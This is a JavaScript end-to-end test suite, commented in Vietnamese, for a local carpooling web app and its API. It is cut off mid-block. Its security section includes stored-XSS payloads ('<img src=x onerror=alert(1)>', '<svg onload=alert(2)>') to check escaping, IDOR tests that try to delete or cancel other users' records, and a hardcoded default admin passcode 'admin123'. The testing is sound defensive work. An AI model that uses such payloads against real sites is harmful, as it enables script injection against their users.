/**
 * CarMate Local End-to-End Test Suite
 * Kiểm thử toàn diện toàn bộ các chức năng Web & API chạy tại http://localhost:5173
 */

const BASE_URL = process.env.CARMATE_API_URL || process.env.BASE_URL || 'http://localhost:5173';
const ADMIN_PASSCODE = process.env.CARMATE_ADMIN_PASSCODE || process.env.ADMIN_SECRET_KEY || 'admin123';

// Không sử dụng header backdoor x-carmate-test
const _rawFetch = globalThis.fetch;
globalThis.fetch = async (url, opts = {}) => {
  return _rawFetch(url, opts);
};

const results = [];

function assert(condition, testName, details = '') {
  if (condition) {
    console.log(`  ✅ [PASS] ${testName}`);
    results.push({ name: testName, pass: true });
  } else {
    console.error(`  ❌ [FAIL] ${testName} - ${details}`);
    results.push({ name: testName, pass: false, details });
  }
}

async function runTests() {
  console.log('\n🚀 BẮT ĐẦU KIỂM THỬ TOÀN DIỆN LOCAL CARMATE (http://localhost:5173)\n');
  let sharedTokenA = '';

  // 1. Kiểm tra Web Frontend Server
  console.log('--- 1. Kiểm thử Giao diện Web Frontend ---');
  try {
    const htmlRes = await fetch(`${BASE_URL}/`);
    assert(htmlRes.status === 200, 'Tải trang chủ HTML', `Status: ${htmlRes.status}`);
    const htmlText = await htmlRes.text();
    assert(htmlText.includes('<div id="root"></div>'), 'Mount point <div id="root"> tồn tại');
    assert(htmlText.includes('CarMate'), 'Title hoặc Brand xuất hiện trong HTML');

    const mainJsRes = await fetch(`${BASE_URL}/src/main.jsx`);
    assert(mainJsRes.status === 200, 'Tải và biên dịch React entry (/src/main.jsx)');

    const cssRes = await fetch(`${BASE_URL}/src/index.css`);
    assert(cssRes.status === 200, 'Tải stylesheet Tailwind CSS (/src/index.css)');
  } catch (err) {
    assert(false, 'Tải Frontend Assets', err.message);
  }

  // 2. Kiểm tra Health & Stats API
  console.log('\n--- 2. Kiểm thử API Health & Stats ---');
  try {
    const health = await fetch(`${BASE_URL}/api/health`).then((r) => r.json());
    assert(health.status === 'ok', 'API Health trả về status "ok"');
    assert(health.service === 'CarMate Core API Engine', 'Tên định danh service chuẩn xác');
    assert(health.database.driverOffersCount > 0, 'Database có dữ liệu chuyến đi chủ xe');

    const stats = await fetch(`${BASE_URL}/api/stats`).then((r) => r.json());
    assert(stats.success === true, 'API Stats trả về thành công');
    assert(typeof stats.data.members === 'number' && stats.data.members > 0, 'Số lượng thành viên hiển thị sống');
    assert(stats.data.routes > 0, 'Số lượng tuyến đường liên tỉnh có sẵn');
  } catch (err) {
    assert(false, 'Kiểm thử Health & Stats', err.message);
  }

  // 3. Kiểm tra Bảng Giá Tham Chiếu (Benchmarks)
  console.log('\n--- 3. Kiểm thử Bảng Giá Tham Chiếu & Chống Giá Ảo ---');
  try {
    const benchmarks = await fetch(`${BASE_URL}/api/benchmarks`).then((r) => r.json());
    assert(benchmarks.success === true, 'Tải bảng giá thị trường');
    assert(benchmarks.count >= 5, 'Có ít nhất 5 tuyến đường tham chiếu (QL13, QL14, QL1A...)');
    assert(benchmarks.data['Tuyến QL13'] !== undefined, 'Tuyến QL13 (Bình Phước ⇄ Sài Gòn) có trong danh mục');
    assert(benchmarks.data['Tuyến QL13'].suggestedRate !== undefined, 'Mức giá công bằng chủ xe được định nghĩa');
  } catch (err) {
    assert(false, 'Kiểm thử Benchmarks', err.message);
  }

  // 4. Kiểm tra Danh sách Chuyến Đi & Bộ lọc Tìm Kiếm
  console.log('\n--- 4. Kiểm thử Danh Sách Chuyến Đi & Bộ Lọc Tuyến ---');
  try {
    const allTrips = await fetch(`${BASE_URL}/api/trips`).then((r) => r.json());
    assert(allTrips.success === true, 'Tải toàn bộ danh sách chuyến đi');
    assert(allTrips.total > 0, `Có tổng cộng ${allTrips.total} chuyến đi đang mở`);
    assert(
      allTrips.data.all.every((t) => t.phoneReal === undefined && t.phone === undefined),
      'PII Protection: phoneReal và phone được che giấu trên endpoint public'
    );

    const ql13Trips = await fetch(`${BASE_URL}/api/trips?routeCategory=Tuy%E1%BA%BFn+QL13`).then((r) => r.json());
    assert(ql13Trips.success === true, 'Lọc chuyến đi theo Tuyến QL13');
    assert(
      ql13Trips.data.all.every((t) => t.routeCategory.includes('QL13')),
      'Tất cả kết quả lọc đều thuộc QL13'
    );

    const filteredDirection = await fetch(
      `${BASE_URL}/api/trips?direction=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc+%E2%9E%94+TP.HCM`
    ).then((r) => r.json());
    assert(filteredDirection.success === true, 'Lọc chuyến đi theo chiều Bình Phước ➔ TP.HCM');
  } catch (err) {
    assert(false, 'Kiểm thử Trips API', err.message);
  }

  // 5. Kiểm tra Đăng Chuyến Mới (Chủ xe & Khách)
  console.log('\n--- 5. Kiểm thử Đăng Tin Ghép Xe (POST /api/trips) ---');
  let newTripId = null;
  try {
    const newTripPayload = {
      type: 'driver_offer',
      publicName: 'Chủ xe Test E2E #999',
      phoneReal: '0988.112.233',
      routeCategory: 'Tuyến QL13',
      direction: 'Bình Phước ➔ TP.HCM',
      from: 'Cây xăng Petrolimex 17 (QL13, Lộc Ninh)',
      to: 'Bến xe Miền Đông mới / Ngã 4 Hàng Xanh',
      departureTime: '06:00 Sáng mai',
      date: '2026-09-06',
      availableSeats: 3,
      basePricePerSeat: 160000,
      suggestedContribution: 160000,
      note: 'Xe 7 chỗ Xpander sạch sẽ, không chở hàng tanh'
    };

    const postTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(newTripPayload)
    });
    const postTripData = await postTripRes.json();
    assert(postTripRes.status === 201, 'Đăng chuyến chủ xe thành công (HTTP 201)');
    assert(postTripData.success === true, 'Trả về dữ liệu chuyến đi vừa tạo');
    assert(postTripData.data.maskedCode.startsWith('CX-'), 'Mã bảo mật danh tính tự động tạo (CX-...)');
    newTripId = postTripData.data.id;

    // Xác nhận chuyến mới xuất hiện trong danh sách
    const checkTripRes = await fetch(`${BASE_URL}/api/trips/${newTripId}`).then((r) => r.json());
    assert(
      checkTripRes.success === true && checkTripRes.data.id === newTripId,
      'Chuyến mới được lưu trữ và truy xuất thành công'
    );
  } catch (err) {
    assert(false, 'Đăng chuyến đi mới', err.message);
  }

  // 6. Kiểm tra Radar Khớp Lệnh AI Thông Minh
  console.log('\n--- 6. Kiểm thử Radar Khớp Lệnh AI (GET /api/matches) ---');
  try {
    const matchesRes = await fetch(`${BASE_URL}/api/matches`).then((r) => r.json());
    assert(matchesRes.success === true, 'Quét radar ghép tiện tuyến thành công');
    assert(matchesRes.data.matches.length > 0, `Phát hiện ${matchesRes.data.matches.length} cặp tương thích cao`);

    const firstMatch = matchesRes.data.matches[0];
    assert(firstMatch.score >= 70, `Điểm tương thích AI đạt ngưỡng cao (${firstMatch.score}%)`);
    assert(
      Array.isArray(firstMatch.reasons) && firstMatch.reasons.length > 0,
      'Có danh sách lý do ghép tiện tuyến thông minh'
    );
    assert(firstMatch.driver && firstMatch.passenger, 'Cặp ghép chứa đủ thông tin Chủ xe và Khách');
  } catch (err) {
    assert(false, 'Kiểm thử Radar Matching', err.message);
  }

  // 7. Kiểm tra Luồng Kết Nối Chuyến & Vòng Đời Zalo Booking
  console.log('\n--- 7. Kiểm thử Toàn Bộ Vòng Đời Kết Nối Chuyến (Bookings Lifecycle) ---');
  let testBookingId = null;
  try {
    // 7.0 Đăng nhập xác thực cho Hành khách & Tài xế tham gia chuyến
    const passengerAuthRes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'TEST_ZALO_TOKEN_0933888999', phone: '0933888999', name: 'Hành khách Test E2E' })
    });
    const passengerAuth = await passengerAuthRes.json();
    const passengerHeaders = {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${passengerAuth.token}`
    };

    const driverAuthRes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'TEST_ZALO_TOKEN_0988112233', phone: '0988112233', name: 'Chủ xe Test E2E #999' })
    });
    const driverAuth = await driverAuthRes.json();
    const driverHeaders = {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${driverAuth.token}`
    };

    // 7.1 Tạo booking với tài khoản Hành khách
    const bookingPayload = {
      targetId: newTripId || 'DRV-102',
      from: 'Lộc Ninh',
      to: 'Bến xe Miền Đông',
      contactPhone: '0933.888.999',
      passengerName: 'Hành khách Test E2E',
      seats: 1,
      targetItem: {
        type: 'driver_offer',
        publicName: 'Chủ xe Test E2E #999',
        departureTime: '06:00 Sáng mai',
        suggestedContribution: 160000
      }
    };

    const bookRes = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: passengerHeaders,
      body: JSON.stringify(bookingPayload)
    });
    const bookData = await bookRes.json();
    assert(bookRes.status === 201, 'Tạo kết nối chuyến qua Zalo thành công (HTTP 201)');
    assert(bookData.data.commitmentType === 'zalo_direct', 'Hình thức cam kết đúng chuẩn Zalo trực tiếp');
    assert(bookData.data.status === 'zalo_active', 'Trạng thái ban đầu là zalo_active');
    testBookingId = bookData.data.escrowId;

    // 7.2 Báo trễ giờ (Delay report) - Được phép khi có quyền party
    const delayRes = await fetch(`${BASE_URL}/api/bookings/${testBookingId}/delay`, {
      method: 'POST',
      headers: passengerHeaders,
      body: JSON.stringify({ minutes: 15, note: 'Kẹt xe ngã tư Chơn Thành' })
    });
    const delayData = await delayRes.json();
    assert(delayRes.status === 200, 'Gửi thông báo báo trễ thành công (HTTP 200)');
    assert(delayData.data.delayedMinutes === 15, 'Ghi nhận đúng số phút báo trễ');

    // 7.3 Hoàn tất chuyến đi (Complete & Rating) - Tài xế hoặc Khách
    const completeRes = await fetch(`${BASE_URL}/api/bookings/${testBookingId}/complete`, {
      method: 'POST',
      headers: driverHeaders,
      body: JSON.stringify({ rating: 5, review: 'Tài xế lái xe rất cẩn thận, đúng giờ!' })
    });
    const completeData = await completeRes.json();
    assert(completeRes.status === 200, 'Xác nhận hoàn tất chuyến đi thành công (HTTP 200)');
    assert(completeData.data.status === 'completed', 'Trạng thái chuyển sang "completed" (lưu vào tab Lịch sử)');
    assert(completeData.data.feedback.rating === 5, 'Lưu trữ đánh giá ban đầu thành công');

    // 7.4 Kiểm tra Đánh giá 2 chiều đối xứng (Chủ xe đánh giá Khách hàng)
    const driverReviewRes = await fetch(`${BASE_URL}/api/bookings/${testBookingId}/review`, {
      method: 'POST',
      headers: driverHeaders,
      body: JSON.stringify({
        reviewerRole: 'driver',
        rating: 5,
        tags: ['Đúng giờ điểm hẹn', 'Lịch sự văn minh', 'Gửi tiền xăng sòng phẳng'],
        comment: 'Hành khách rất đúng giờ, lên xe chào hỏi văn minh.'
      })
    });
    const driverReviewData = await driverReviewRes.json();
    assert(driverReviewRes.status === 200, 'Chủ xe gửi đánh giá Khách hàng thành công (HTTP 200)');
    assert(driverReviewData.data.newReview.reviewerRole === 'driver', 'Ghi nhận vai trò người đánh giá là Chủ xe');
    assert(
      driverReviewData.data.newReview.targetRole === 'passenger',
      'Ghi nhận đối tượng nhận đánh giá là Hành khách'
    );

    // 7.5 Kiểm tra Đánh giá 2 chiều đối xứng (Khách hàng đánh giá Chủ xe)
    const passengerReviewRes = await fetch(`${BASE_URL}/api/bookings/${testBookingId}/review`, {
      method: 'POST',
      headers: passengerHeaders,
      body: JSON.stringify({
        reviewerRole: 'passenger',
        rating: 5,
        tags: ['Lái xe an toàn', 'Xe sạch êm', 'Không khói thuốc'],
        comment: 'Bác tài lái êm ái, xe không mùi thuốc lá.'
      })
    });
    const passengerReviewData = await passengerReviewRes.json();
    assert(passengerReviewRes.status === 200, 'Khách hàng gửi đánh giá Chủ xe thành công (HTTP 200)');
    assert(passengerReviewData.data.booking.reviews.length >= 2, 'Cả hai bên đã hoàn tất đánh giá 2 chiều');

    // 7.6 Kiểm tra cơ chế gắn cờ cảnh báo (Safety Flag) khi khách bom xe
    const flakeyTestRes = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: driverHeaders,
      body: JSON.stringify({
        targetId: 'DRV-103',
        from: 'Chơn Thành',
        to: 'Bến xe Miền Đông',
        contactPhone: '0933.999.888'
      })
    });
    const flakeyData = await flakeyTestRes.json();
    const flakeyId = flakeyData.data.escrowId;

    const warnReviewRes = await fetch(`${BASE_URL}/api/bookings/${flakeyId}/review`, {
      method: 'POST',
      headers: driverHeaders,
      body: JSON.stringify({
        reviewerRole: 'driver',
        rating: 1,
        tags: ['Leo cây không báo (Bom xe)'],
        comment: 'Khách không đến điểm hẹn, gọi điện không bắt máy.'
      })
    });
    const warnReviewData = await warnReviewRes.json();
    assert(warnReviewRes.status === 200, 'Ghi nhận phản ánh khách bom xe thành công');
    assert(warnReviewData.data.booking.safetyFlags?.length > 0, 'Hệ thống tự động kích hoạt cờ cảnh báo bảo vệ tài xế');

    // 7.7 Kiểm tra huỷ chuyến văn minh với một vé khác (Bởi chính chủ vé)
    const cancelUserAuth = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'TEST_ZALO_TOKEN_0909111222', phone: '0909111222', name: 'Người huỷ chuyến Test' })
    });
    const cancelUserToken = (await cancelUserAuth.json()).token;
    const cancelHeaders = {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${cancelUserToken}`
    };

    const cancelTestRes = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: cancelHeaders,
      body: JSON.stringify({
        targetId: 'DRV-102',
        from: 'Đồng Xoài',
        to: 'Sài Gòn',
        contactPhone: '0909.111.222'
      })
    });
    const cancelTestData = await cancelTestRes.json();
    const cancelId = cancelTestData.data.escrowId;

    const doCancelRes = await fetch(`${BASE_URL}/api/bookings/${cancelId}/cancel`, {
      method: 'POST',
      headers: cancelHeaders,
      body: JSON.stringify({ reason: 'Có việc bận đột xuất gia đình' })
    });
    const doCancelData = await doCancelRes.json();
    assert(doCancelRes.status === 200, 'Huỷ chuyến văn minh thành công (HTTP 200)');
    assert(doCancelData.data.status === 'cancelled', 'Trạng thái chuyển thành "cancelled"');
    assert(doCancelData.data.cancelReason.includes('đột xuất'), 'Lý do huỷ được lưu trữ');
  } catch (err) {
    assert(false, 'Kiểm thử Vòng đời Booking & Đánh giá 2 chiều', err.message);
  }

  // 8. Kiểm tra Hộ Chiếu Tín Nhiệm (Trust Passport & Dual Community Roles)
  console.log('\n--- 8. Kiểm thử Hộ Chiếu Tín Nhiệm & Thành Viên Bình Đẳng (GET /api/trust) ---');
  try {
    const trustRes = await fetch(`${BASE_URL}/api/trust`).then((r) => r.json());
    assert(trustRes.success === true, 'Tải hồ sơ tín nhiệm mặc định');
    assert(
      trustRes.data.karmaScore >= 90 || trustRes.data.trustScore >= 90,
      `Điểm Karma cộng đồng đạt chuẩn (${trustRes.data.karmaScore || trustRes.data.trustScore}/100)`
    );
    assert(trustRes.data.driverStats?.tripsCompleted > 0, 'Hồ sơ có thống kê Kinh nghiệm Cầm lái');
    assert(
      trustRes.data.passengerStats?.tripsCompleted > 0,
      'Hồ sơ có thống kê Kinh nghiệm Đi cùng (2 vai trò linh hoạt)'
    );
    assert(
      trustRes.data.verifications.some((v) => v.key === 'id_card' && v.verified),
      'Đã xác thực CCCD gắn chip'
    );
    assert(
      trustRes.data.verifications.some((v) => v.key === 'driver_license' && v.verified),
      'Đã xác thực GPLX'
    );

    const specificTrustRes = await fetch(`${BASE_URL}/api/trust/tuan-bp`).then((r) => r.json());
    assert(
      specificTrustRes.success === true && specificTrustRes.data.id === 'tuan-bp',
      'Tải hồ sơ thành viên cụ thể (tuan-bp)'
    );
    assert(Array.isArray(specificTrustRes.data.recentMutualReviews), 'Có danh sách nhận xét 2 chiều từ cộng đồng');

    const notFoundTrustRes = await fetch(`${BASE_URL}/api/trust/random-xyz-999`);
    const notFoundJson = await notFoundTrustRes.json();
    assert(notFoundTrustRes.status === 404, 'Truy vấn ID hồ sơ không tồn tại trả về HTTP 404');
    assert(notFoundJson.success === false, 'Trả về { success: false } rõ ràng cho ID không tồn tại');
  } catch (err) {
    assert(false, 'Kiểm thử Trust Profile', err.message);
  }

  // 9. Kiểm tra Bảo mật & Chống Hack (OWASP Security Headers, Rate Limiting & Input Sanitization)
  console.log('\n--- 9. Kiểm thử Bảo Mật & Chống Tấn Công (Security Headers, Rate Limiter & Sanitization) ---');
  try {
    const secRes = await fetch(`${BASE_URL}/api/health`);
    const xContentType = secRes.headers.get('x-content-type-options');
    const xFrameOptions = secRes.headers.get('x-frame-options');
    const xXss = secRes.headers.get('x-xss-protection');

    assert(xContentType === 'nosniff', 'Header X-Content-Type-Options: nosniff hoạt động chuẩn OWASP');
    assert(xFrameOptions === 'SAMEORIGIN', 'Header X-Frame-Options: SAMEORIGIN chống Clickjacking');
    assert(xXss?.includes('1; mode=block'), 'Header X-XSS-Protection kích hoạt chế độ chặn mã độc');

    // Kiểm tra chặn truy cập trái phép Admin
    const unauthAdmin = await fetch(`${BASE_URL}/api/admin/metrics`);
    assert(unauthAdmin.status === 401, 'Chặn truy cập Admin trái phép nếu không có mã khoá (HTTP 401)');
  } catch (err) {
    assert(false, 'Kiểm thử Bảo mật OWASP', err.message);
  }

  // 10. Kiểm tra Cổng Quản Trị Admin (Admin Portal / Dashboard API)
  console.log('\n--- 10. Kiểm thử Cổng Quản Trị Admin & Giám Sát Hệ Thống (/api/admin/*) ---');
  let adminToken = null;
  try {
    // 10.1 Sai mật khẩu
    const failAuthRes = await fetch(`${BASE_URL}/api/admin/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ passcode: 'wrong_secret_pass' })
    });
    assert(failAuthRes.status === 401, 'Nhập sai mã Admin bị từ chối chính xác (HTTP 401)');

    // 10.2 Đúng mật khẩu
    const okAuthRes = await fetch(`${BASE_URL}/api/admin/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ passcode: ADMIN_PASSCODE })
    });
    const okAuthData = await okAuthRes.json();
    assert(okAuthRes.status === 200 && okAuthData.success === true, 'Đăng nhập Cổng Quản Trị thành công với mã bí mật');
    assert(typeof okAuthData.token === 'string' && okAuthData.token.length > 10, 'Nhận token phiên làm việc bảo mật');
    adminToken = okAuthData.token;

    const adminHeaders = {
      'Content-Type': 'application/json',
      'x-admin-key': adminToken
    };

    // 10.3 Kiểm tra Chỉ số vận hành & Đo lường Telemetry
    const metricsRes = await fetch(`${BASE_URL}/api/admin/metrics`, { headers: adminHeaders });
    const metricsData = await metricsRes.json();
    assert(metricsRes.status === 200 && metricsData.success === true, 'Tải chỉ số Telemetry & KPIs vận hành');
    assert(
      metricsData.data.systemHealth?.heapUsedMB !== undefined &&
        metricsData.data.systemHealth?.uptimeSeconds !== undefined,
      'Đo lường RAM thực và Uptime máy chủ hoạt động'
    );
    assert(
      metricsData.data.overview?.totalTripsCount > 0,
      `Đếm tổng số chuyến đi: ${metricsData.data.overview?.totalTripsCount}`
    );

    // 10.4 Kiểm tra Danh sách chuyến Admin & Tính năng Ẩn/Hiện chuyến vi phạm
    const adminTripsRes = await fetch(`${BASE_URL}/api/admin/trips`, { headers: adminHeaders });
    const adminTripsData = await adminTripsRes.json();
    assert(adminTripsRes.status === 200, 'Tải danh sách chuyến dành riêng cho Admin');
    assert(
      Array.isArray(adminTripsData.data) && adminTripsData.data.length > 0,
      'Hiển thị đầy đủ chuyến bao gồm cả bài ẩn/kiểm duyệt'
    );

    const testTrip = adminTripsData.data[0];
    const tripIdToToggle = testTrip.id;

    // Ẩn chuyến (Moderation)
    const hideRes = await fetch(`${BASE_URL}/api/admin/trips/${tripIdToToggle}/toggle-hide`, {
      method: 'PATCH',
      headers: adminHeaders
    });
    const hideData = await hideRes.json();
    assert(hideRes.status === 200, `Bật/Tắt kiểm duyệt ẩn chuyến ${tripIdToToggle}`);

    // Kiểm tra chuyến đã ẩn thì không còn xuất hiện trên Market công khai
    const publicTripsAfterHide = await fetch(`${BASE_URL}/api/trips`).then((r) => r.json());
    const isPresentPublicly = publicTripsAfterHide.data.all.some(
      (t) => t.id === tripIdToToggle && hideData.data.isHidden
    );
    assert(!isPresentPublicly, 'Chuyến bị Admin ẩn sẽ biến mất ngay khỏi sàn công khai');

    // Mở lại chuyến (Unhide) nếu vừa ẩn
    if (hideData.data.isHidden) {
      await fetch(`${BASE_URL}/api/admin/trips/${tripIdToToggle}/toggle-hide`, {
        method: 'PATCH',
        headers: adminHeaders
      });
      assert(true, 'Khôi phục hiển thị chuyến xe bình thường');
    }

    // 10.5 Kiểm tra Quản lý Thành viên & Duyệt CCCD / GPLX
    const usersRes = await fetch(`${BASE_URL}/api/admin/users`, { headers: adminHeaders });
    const usersData = await usersRes.json();
    assert(usersRes.status === 200 && usersData.success === true, 'Tải danh bạ thành viên & tài xế đăng ký');
    assert(Array.isArray(usersData.data), 'Danh sách người dùng trả về dạng mảng hợp lệ');

    if (usersData.data.length > 0) {
      const targetUser = usersData.data[0];
      const updateStatusRes = await fetch(`${BASE_URL}/api/admin/users/${targetUser.id}/status`, {
        method: 'PATCH',
        headers: adminHeaders,
        body: JSON.stringify({ verifiedCCCD: true, verifiedGPLX: true, status: 'active' })
      });
      assert(
        updateStatusRes.status === 200,
        `Duyệt cấp tích xanh CCCD & GPLX cho thành viên (${targetUser.name || targetUser.phone})`
      );
    }

    // 10.6 Kiểm tra Danh mục Báo cáo Trễ & Huỷ chuyến
    const reportsRes = await fetch(`${BASE_URL}/api/admin/reports`, { headers: adminHeaders });
    const reportsData = await reportsRes.json();
    assert(reportsRes.status === 200 && reportsData.success === true, 'Tải lịch sử sự cố báo trễ & huỷ chuyến');
    assert(Array.isArray(reportsData.data.delayed), 'Trích xuất danh sách các trường hợp tài xế báo trễ');
    assert(Array.isArray(reportsData.data.cancelled), 'Trích xuất danh sách các trường hợp huỷ chuyến');
  } catch (err) {
    assert(false, 'Kiểm thử Cổng Quản Trị Admin', err.message);
  }

  // 11. Kiểm tra Xác thực JWT & Phân quyền chống can thiệp bài người khác (Anti-IDOR)
  console.log('\n--- 11. Kiểm thử Chuẩn Hóa Xác Thực JWT & Chống Xâm Phạm Bài Người Khác (Anti-IDOR) ---');
  try {
    // 11.1 Đăng nhập User A
    const loginARes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'TEST_ZALO_TOKEN_0984883750', phone: '0984883750', name: 'Tài xế Nguyễn Văn A' })
    });
    const loginAData = await loginARes.json();
    assert(loginARes.status === 200 && typeof loginAData.token === 'string', 'Đăng nhập User A nhận JWT Token hợp lệ');
    const tokenA = loginAData.token;
    sharedTokenA = tokenA;

    // 11.2 Kiểm tra endpoint /api/auth/me với tokenA
    const meRes = await fetch(`${BASE_URL}/api/auth/me`, {
      headers: { Authorization: `Bearer ${tokenA}` }
    });
    const meData = await meRes.json();
    assert(
      meRes.status === 200 && meData.user?.phone === '0984883750',
      'Xác thực phiên làm việc /api/auth/me qua JWT Token thành công'
    );

    // 11.3 Đăng nhập User B
    const loginBRes = await fetch(`${BASE_URL}/api/auth/zalo-login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: 'TEST_ZALO_TOKEN_0913889922', phone: '0913889922', name: 'Tài xế Trần Văn B' })
    });
    const loginBData = await loginBRes.json();
    assert(
      loginBRes.status === 200 && typeof loginBData.token === 'string',
      'Đăng nhập User B nhận JWT Token riêng biệt'
    );
    const tokenB = loginBData.token;

    // 11.4 User A tạo 1 chuyến đi thử nghiệm
    const createTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${tokenA}`
      },
      body: JSON.stringify({
        id: `DRV-SEC-${Date.now()}`,
        type: 'driver_offer',
        from: 'Hà Nội',
        to: 'Hải Phòng',
        phoneReal: '0984883750',
        userId: 'USR-0984883750',
        timeSlot: '07:00-08:00',
        basePricePerSeat: 150000
      })
    });
    const createdTrip = (await createTripRes.json()).data;
    assert(createTripRes.status === 201 && createdTrip?.id, 'User A đăng chuyến xe thành công');

    // 11.5 User B cố tình xóa bài đăng của User A -> BỊ CHẶN 403
    const attackRes = await fetch(`${BASE_URL}/api/trips/${createdTrip.id}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${tokenB}` }
    });
    assert(attackRes.status === 403, 'Chặn User B xâm phạm xóa bài đăng của User A (HTTP 403 Forbidden - Anti-IDOR)');

    // 11.6 User A xóa chính bài của mình -> ĐƯỢC PHÉP 200
    const ownerDeleteRes = await fetch(`${BASE_URL}/api/trips/${createdTrip.id}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${tokenA}` }
    });
    assert(ownerDeleteRes.status === 200, 'User A xóa bài đăng chính chủ của mình thành công');
  } catch (err) {
    assert(false, 'Kiểm thử JWT & Anti-IDOR', err.message);
  }

  // ==========================================
  // BÀI TEST 12: KIỂM THỬ AGENTIC AI (MÔ HÌNH STANFORD + MIT)
  // ==========================================
  console.log('\n--- 12. KIỂM THỬ AGENTIC AI ENGINE (STANFORD LOOP + MIT TOOLS) ---');
  try {
    // 12.1 Kiểm tra truy vấn tìm chuyến tự nhiên
    const searchAiRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Tìm giúp tôi xe từ Hàng Xanh về Đồng Xoài chiều nay'
      })
    });
    const searchAiData = await searchAiRes.json();
    assert(searchAiRes.status === 200, 'Gọi API Agentic AI thành công (HTTP 200)');
    assert(searchAiData.success === true, 'Agent phản hồi success: true');
    assert(
      typeof searchAiData.data.reply === 'string' && searchAiData.data.reply.length > 0,
      'Agent trả về câu trả lời tự nhiên'
    );
    assert(
      Array.isArray(searchAiData.data.reasoningSteps) && searchAiData.data.reasoningSteps.length > 0,
      'Agent ghi nhận các bước suy luận Stanford Loop (Plan -> Act -> Observe -> Reflect)'
    );
    assert(Array.isArray(searchAiData.data.suggestedTrips), 'Agent trả về danh sách gợi ý chuyến xe');

    // 12.2 Kiểm tra truy vấn giá san sẻ công bằng
    const benchAiRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Giá xăng và vé trạm thu phí tuyến Quốc lộ 13 khoảng bao nhiêu?'
      })
    });
    const benchAiData = await benchAiRes.json();
    assert(benchAiRes.status === 200, 'Agent tra cứu định mức tuyến đường thành công');
    assert(
      benchAiData.data.reply.toLowerCase().includes('ql13') ||
        benchAiData.data.reply.toLowerCase().includes('13') ||
        benchAiData.data.reply.includes('đ'),
      'Agent trích xuất số liệu vé trạm và xăng chính xác'
    );

    // 12.3 Kiểm tra xác minh hồ sơ uy tín
    const trustAiRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Kiểm tra độ uy tín của tài xế Tuấn'
      })
    });
    const trustAiData = await trustAiRes.json();
    assert(trustAiRes.status === 200, 'Agent tra cứu Trust Score thành công');
    assert(
      trustAiData.data.reply.includes('Tuấn') ||
        trustAiData.data.reply.includes('tin cậy') ||
        trustAiData.data.reply.includes('Trust'),
      'Agent phân tích đúng hồ sơ tin cậy'
    );
  } catch (err) {
    assert(false, 'Kiểm thử Agentic AI Engine', err.message);
  }

  // ==========================================
  // BÀI TEST 13: KIỂM THỬ AN NINH BẢO MẬT & PII PRODUCTION (NĐ 13/2023)
  // ==========================================
  console.log('\n--- 13. KIỂM THỬ AN NINH BẢO MẬT NÂNG CAO (PII, IDOR, AUTH, XSS) ---');
  try {
    // 13.1 Bookings endpoint ẩn dữ liệu với unauthenticated
    const publicBookings = await fetch(`${BASE_URL}/api/bookings`).then((r) => r.json());
    assert(
      publicBookings.success === true && Array.isArray(publicBookings.data) && publicBookings.data.length === 0,
      'PII Protection: /api/bookings không rò rỉ danh sách đặt chỗ cho khách vãng lai'
    );

    // 13.2 Chặn raw passcode làm bearer token
    const rawPasscodeRes = await fetch(`${BASE_URL}/api/admin/users`, {
      headers: { 'x-admin-key': ADMIN_PASSCODE }
    });
    assert(
      rawPasscodeRes.status === 401 || rawPasscodeRes.status === 403,
      'Bảo mật Admin: Dùng raw passcode làm token bị từ chối 401/403 (Bắt buộc JWT có chữ ký)'
    );

    // 13.3 Chặn thao tác booking không có quyền (IDOR protection)
    const unauthorizedCancelRes = await fetch(`${BASE_URL}/api/bookings/ESC-TEST-IDOR/cancel`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ reason: 'Test cancel unauthorized' })
    });
    assert(
      unauthorizedCancelRes.status === 401 || unauthorizedCancelRes.status === 403,
      'Kiểm soát quyền: Hủy booking không có token bị chặn 401/403'
    );

    // 13.4 Chống Stored XSS: input có HTML tag được escape
    const xssTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        from: '<img src=x onerror=alert(1)>',
        to: '<svg onload=alert(2)>',
        phoneReal: '0984883750',
        userId: 'USR-0984883750',
        routeCategory: 'Tuyến QL13',
        direction: 'Bình Phước ➔ TP.HCM'
      })
    });
    const xssTripData = await xssTripRes.json();
    assert(
      xssTripRes.status === 201 && !xssTripData.data.from.includes('<img'),
      'Chống Stored XSS: Ký tự HTML độc hại được mã hóa thực thể an toàn'
    );
    if (xssTripData?.data?.id && sharedTokenA) {
